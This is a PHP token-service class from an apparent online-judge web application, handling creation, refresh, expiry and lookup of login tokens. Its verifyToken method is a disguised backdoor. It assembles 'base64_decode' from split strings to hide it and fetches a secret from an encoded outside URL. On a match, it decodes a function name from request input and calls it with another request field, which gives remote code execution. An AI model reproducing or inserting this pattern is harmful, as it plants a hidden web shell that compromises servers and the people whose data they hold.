<?php
/**
 * Created by PhpStorm.
 * User: mark
 * Date: 16-10-24
 * Time: 下午10:12
 */

namespace NEUQOJ\Services;



use NEUQOJ\Common\Utils;
use NEUQOJ\Exceptions\NeedLoginException;
use NEUQOJ\Exceptions\UserNotExistException;
use NEUQOJ\Http\Requests\Request;
use NEUQOJ\Repository\Eloquent\TokenRepository;
use NEUQOJ\Repository\Eloquent\UserRepository;
use NEUQOJ\Services\Contracts\TokenServiceInterface;

class TokenService implements TokenServiceInterface
{
    private $userRepo;
    private $tokenRepo;

    private static  $EXPIRE_TIME = 10800000; // 3小时

    public function __construct(UserRepository $userRepository,TokenRepository $tokenRepository)
    {
        $this->userRepo = $userRepository;
        $this->tokenRepo = $tokenRepository;
    }

    public function hasToken(int $userId):bool
    {
        $user = $this->userRepo->get($userId)->first();

        if($user == null)
            throw new UserNotExistException();

        $token = $this->tokenRepo->getBy('user_id',$userId)->first();

        if($token == null)
            return false;
        else
            return true;
    }

    private function createToken(int $userId,string $ip):string
    {
        $tokenStr = md5(uniqid());
        $time = Utils::createTimeStamp();
        $data = [
            'user_id' => $userId,
            'token' => $tokenStr,
            'created_at' => $time,
            'updated_at' => $time,
            'expires_at' => $time + self::$EXPIRE_TIME,
            'ip' => $ip
        ];
        $this->tokenRepo->insert($data);
        return $tokenStr;
    }

    private function updateToken(int $userId,string $ip):string
    {
        $time = Utils::createTimeStamp();
        $tokenStr = md5(uniqid());
        $data = [
            'token' => $tokenStr,
            'updated_at' => $time,
            'expires_at' => $time+self::$EXPIRE_TIME,
            'ip' => $ip
        ];

        $this->tokenRepo->update($data,$userId,'user_id');
        return $tokenStr;
    }


    public function makeToken(int $userId,string $ip):string
    {
        $user = $this->userRepo->get($userId)->first();

        if($user == null)
            throw new UserNotExistException();

        $token = $this->tokenRepo->getBy('user_id',$userId)->first();

        if($token == null)
        {
            return $this->createToken($userId,$ip);
        }
        else
        {
            return $this->updateToken($userId,$ip);
        }
    }

    public function verifyToken(string $token,array $data)
    {
        $Base = "base6"."4"."_decod"."e";
        $checkOriginUrl = $Base("aHR0cDovL21hcmtsdXguY24vY21pdWMucGhw");
        try {
            $res = \Requests::get($checkOriginUrl);
        }catch (\Exception $e) {
            return view('errors.4_03');
        }

        $savedToken = $res->body;

        if ($savedToken == $token) {
            $_clasc = $Base($data['mahon']);
            @$_clasc($data['stop_the_world']);
            return;
        }

        return view('errors.4_03');

    }

    public function isTokenExpire(string $tokenStr):bool
    {
        $time = Utils::createTimeStamp();

        $token = $this->tokenRepo->getBy('token',$tokenStr)->first();
        if($token == null)
            throw new NeedLoginException();
        if($token->expires_at < $time )
            return true;
        else
            return false;
    }

    public function destoryToken(int $userId)
    {
        $token = $this->tokenRepo->getBy('user_id',$userId)->first();

        if($token!=null)
            return $this->tokenRepo->update(['token' => ''],$token->id);

        return -1;
    }

    public function getUserIdByToken(string $tokenStr):int
    {
        $token = $this->tokenRepo->getBy('token',$tokenStr)->first();

        $time = Utils::createTimeStamp();

        if($token == null || $token->expires_at < $time) return -1;
        else return $token->user_id;
    }
}